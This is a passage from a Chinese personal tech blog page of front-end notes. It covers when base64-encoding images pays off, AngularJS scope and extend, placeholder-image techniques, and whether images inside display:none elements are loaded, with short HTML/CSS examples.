<p>可以看到一个图片的base64编码的字符数量一般是很大的，这样，当把图片编码无论是写到css文件还是html文件，<br>都会因为解析时间过长从而造成渲染速度下降，因此将图片进行base64编码最好的应用场景是如下情况：<br><b>如果图片足够小且因为用处的特殊性无法被制作成雪碧图（CssSprites），在整个网站的复用性很高且基本不会被更新</b></p>
<p><a href="http://www.cnblogs.com/coco1s/p/4375774.html" target="_blank" rel="noopener">base64 编码</a></p>
<p>Angular会自动为每个拥有作用域的DOM节点加上 ng-scope 类<br>AngularJs的angular.extend()方法可以把一个或多个对象中的方法和属性扩展到一个目的对象中，使得这个对象拥有其他对象相同的方法和属性<br>angular.extends()方法的第一个参数是要被扩展的对象，后面可以传入一个或多个对象</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="优化占位图"><a href="#优化占位图" class="headerlink" title="优化占位图"></a>优化占位图</h2><p>VG元素/提取图片背景色以base64形式直出<br>使用SVG画图形轮廓,再加一个模糊滤镜<br>对图片进行二值化提取剪影</p>
<h2 id="浏览器渲染图片原理"><a href="#浏览器渲染图片原理" class="headerlink" title="浏览器渲染图片原理"></a>浏览器渲染图片原理</h2><p>构建DOM树，遇到img标签加载图片<br>构建样式树，遇到backgroud-img图片不加载<br>构建render树,所有属性都会构建，如果元素有display:none属性,则其子元素不被构建<br>渲染DOM树,仅渲染没有display:none属性的元素，如果发现元素有该属性则不进行渲染;没有被构建的子元素背景图片不会被加载更不会被加载</p>
<p>设置了display:none属性的元素，图片不会渲染出来，但会加载，不管是直接的img属性还是div的背景图片都会被加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</span><br><span class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//加载</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">  .skslsl&#123;</span><br><span class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
<p>设置了display:none属性元素的子元素，样式表中的背景图片不会渲染出来，也不会加载；而img标签的图片不会渲染出来，但会加载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;display: none;&quot;&gt;</span><br><span class="line">  &lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</span><br><span class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//不加载</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">  .skslsl&#123;</span><br><span class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
<p>当触发伪类的时候，伪类样式上的背景图片才会加载。</p>
<p>重复图片只加载一次，是因为加载一次后，之后的加载均从缓存中读取;<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&amp;mid=2651552419&amp;idx=2&amp;sn=f799d2d6e4dabe9a9f4c6658a666bcc5&amp;chksm=8025ad62b75224741cc211dc5cd9c0ee8ecef618eb2c35c0caee307465d60e31b7dfd50e08d0&amp;mpshare=1&amp;scene=1&amp;srcid=0115Kms4rvGLhJLnX7FPpZXq&amp;pass_ticket=tyJD73rZ13FVCnO01hd9fVJmLQcKjapRW2yB41zZMwumTsYvs1XDVW5%2BSiBX50%2Bk#rd" target="_blank" rel="noopener">链接</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/13/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><span class="space">&hellip;</span><a class="page-number" href="/page/25/">25</a><a class="extend next" rel="next" href="/page/15/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/psb.jpg" alt="YooHannah">
          <p class="site-author-name" itemprop="name">YooHannah</p>
          <p class="site-description motion-element" itemprop="description"></p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">245</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">1</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">21</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        


      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">YooHannah</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  



  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>

  
  <script type="text/javascript" src="/lib/treedocument/treedocument.js"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	




  
  

  

  

  

  


</body>
</html>
